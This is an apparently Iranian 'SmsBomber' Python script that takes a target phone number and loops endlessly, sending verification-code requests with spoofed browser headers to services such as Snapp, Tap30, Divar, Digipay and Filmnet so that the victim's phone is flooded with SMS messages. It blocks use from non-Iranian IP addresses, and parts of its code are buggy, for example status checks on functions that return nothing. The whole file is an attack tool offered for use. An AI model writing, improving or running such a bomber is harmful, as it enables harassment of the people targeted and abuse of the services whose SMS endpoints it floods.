try:
 from time import sleep
 from requests import get,post
 import os
 from colorama import Fore
 from ipapi import location
except ImportError:
    exit("PLEASE INSTSLLING LIBRARIES\npip install time\npip install requests\npip install colorama\npip install ipapi")
#Loading
os.system("clear")
print(Fore.YELLOW+"\nCheck Your ip")
try: 
 ip = get("https://api.ipify.org").text
 print('\n' + Fore.MAGENTA + ip + Fore.RESET)
 http = get("https://api.ipify.org").text
 cou = location(http)["country"]
 if cou != "IR":
    exit(Fore.LIGHTBLACK_EX + "\nYour IP HAS  BLOCKED"+Fore.LIGHTRED_EX+ "  PLEASE CHANGE IP " + Fore.LIGHTBLUE_EX + "[ Turn OFF VPN ] " + Fore.RESET + '|' + Fore.RED + " Your Country "+ Fore.WHITE +" ↬ " +Fore.GREEN + cou +"\n\n\n\n"+ Fore.RESET)
except Exception as e:
   exit(Fore.RED+"I CAN'T GETTING YOUR IP PLEASE RUN AGAIN")

os.system("clear")
print("loading[■■■30%]\n")
sleep(2)
os.system("clear")
print("loading[■■■■40%]\n")
sleep(2)
os.system("clear")
print("loading[■■■■■■60%]\n")
sleep(2)
os.system("clear")
print("loading[■■■■■■■80%]\n")
sleep(2)
os.system("clear")
print("loading[■■■■■■■■■■100%]\n")
sleep(2)
os.system("clear")
#banner
sleep(0.01)

print(f"""{Fore.RED}   
 ____                ____  t.me/LooQaat _               
/ ___| _ __ ___  ___| __ )  ___  _ __ ___ | |__   ___ _ __ 
\___ \| '_ ` _ \/ __|  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
 ___) | | | | | \__ \ |_) | (_) | | | | | | |_) |  __/ |   
|____/|_| |_| |_|___/____/ \___/|_| |_| |_|_.__/ \___|_|
"""+Fore.RESET)

sleep(1)
try:
 numbers = input(Fore.CYAN+"\nsend your number [912*******] : ")
except KeyboardInterrupt:
   exit(Fore.CYAN+"GoodBye")
#SMS API_KEYS
bingo = (f"https://api.binjo.ir/api/panel/get_code/0{numbers}")
#snapp = (f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{numbers}/sms?cCode=+98")
igap = (f"https://core.gap.im/v1/user/add.json?mobile=0{numbers}")
filmnet = (f"https://api-v2.filmnet.ir/access-token/users/0{numbers}/otp")
def snapp(numbers): 
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":"+98"+numbers}
    sna = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD ).status_code
def tap30(numbers):
  try:  #tap30 api
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+numbers.split("+98"),"role":"PASSENGER"}}
    tap30R = post("https://tap33.me/api/v2/user",headers=tap30H, json=tap30D).status_code 
  except Exception as e:
            print(e)

def hamrahkart(numbers):
    hamrah = {"action":"getAppViaSMS","number": numbers }
    post("https://hamrahcard.ir/wp-admin/admin-ajax.php",data=hamrah).status_code
            
def divar(numbers):
    #divar api
    divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    divarD = {"phone":numbers.split("+98")[1]}
    divarR = post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)

def digipay(numbers):
    digij = {"cellNumber":"0"+numbers,"device":{"deviceId":"a16e6255-17c3-431b-b047-3f66d24c286f","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
    post("https://app.mydigipay.com/digipay/api/users/send-sms",json=digij).status_code  

def smarket(numbers):
    #snapp market api
    smarketH = {"Host": "api.snapp.market","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Origin": "https://snapp.market","Connection": "keep-alive","Referer": "https://snapp.market/?utm_expid=.pY75G19ZSxqVL9e0bOzqzA.0&utm_referrer=https%3A%2F%2Fwww.google.com%2F","Cookie": "_gcl_au=1.1.2061927570.1597858187; _ga=GA1.2.1125304048.1597858200; _gid=GA1.2.1715017326.1597858200; _gaexp=GAX1.2.pY75G19ZSxqVL9e0bOzqzA.18534.0; _hjid=9ed8e1f0-497e-499c-b1ce-ae58867da1bf; _hjAbsoluteSessionInProgress=1; _gat_UA-115113209-4=1","Content-Length": "0","TE": "Trailers"}
    smarketD = "0"+numbers
    smarketR = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={smarketD}', headers=smarketH ).status_code
	
gap = get("https://core.gap.im/v1/user/add.json?mobile=0"+numbers).status_code 
       
while True:
   try:   
      sleep(0.001)
      #SNAPP REQUESTS 
      if snapp(numbers) == 200:
          print(Fore.GREEN+"[ + ] snapp raft tosh")
      else:
          print(Fore.RED+"[-] snapp raft  tosh")
      #binJO REQUESTS 
      bin = get(bingo).status_code
      if bin == 200:
          print(Fore.GREEN+"[ + ] binjo raft tosh")
      else:
          print(Fore.RED+"[-] bing raft tosh")
      #filmnet REQUESTS 
      film = get(filmnet).status_code     
      if film == 200:
          print(Fore.GREEN+"[ + ] filmnet raft tosh")
      else:
          print(Fore.RED+"[-] filmnet raft tosh")
      #tap30 REQUESTS 
      if tap30("+98"+numbers) == 200:
          print(Fore.GREEN+"[ + ] tap30 raft tosh")
      else:
          print(Fore.RED+"[-] tap30 raft tosh")
      #divar REQUESTS 
      if divar("+98"+numbers) == 200:
          print(Fore.GREEN+"[ + ] divar raft tosh")
      else:
          print(Fore.RED+"[-] divar raft tosh")
      #hamrahkart REQUESTS 
      if hamrahkart(numbers) == 200:
         print(Fore.GREEN+"[ + ] hamrahkart raft tosh")
      else:
          print(Fore.RED+"[-] hamrahkart raft tosh")
      #digipay REQUESTS 
      if digipay("0"+numbers) == 200:
           print(Fore.GREEN+"[ + ] digipay raft tosh")
      else:
          print(Fore.RED+"[-] digipay raft tosh")
     #GAP REQUESTS 
      if gap(numbers) == 200:
          print(Fore.GREEN+"[ + ] igap raft tosh")
      else:
          print(Fore.RED+"[-] igap raft tosh")
     #SNAPP MARKET REQUESTS 
      if smarket(numbers) == 200:
          print(Fore.GREEN+"[ + ] SnappMarket raft tosh")
      else:
          print(Fore.RED+"[-] SnapMarket raft tosh")
   except TypeError:
       continue 
   except KeyboardInterrupt:
      exit(Fore.CYAN+"\nGoodBye")
   except ValueError:
      exit("Wrong Number")   
      continue 
      
